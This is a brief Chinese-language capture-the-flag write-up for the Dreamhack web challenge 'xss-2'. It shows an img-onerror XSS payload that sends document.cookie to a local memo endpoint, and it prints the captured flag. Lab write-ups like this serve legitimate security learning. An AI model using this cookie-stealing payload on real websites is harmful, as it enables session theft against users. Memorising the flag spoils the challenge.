跟 `xss-1` 的區別在於進入 `/vuln` 之後 `<script>alert(1)</script>` 沒有效果了

![vuln](/CTFWriteup/Web/assets/xss-2/image.png)

試試別的 payload

```javascript
<img src="x" onerror="location.href='http://127.0.0.1:8000/memo?memo='+document.cookie;">
```

![flag](/CTFWriteup/Web/assets/xss-2/image-1.png)

```
DH{3c01577e9542ec24d68ba0ffb846508f}
```

#Dreamhack #Web
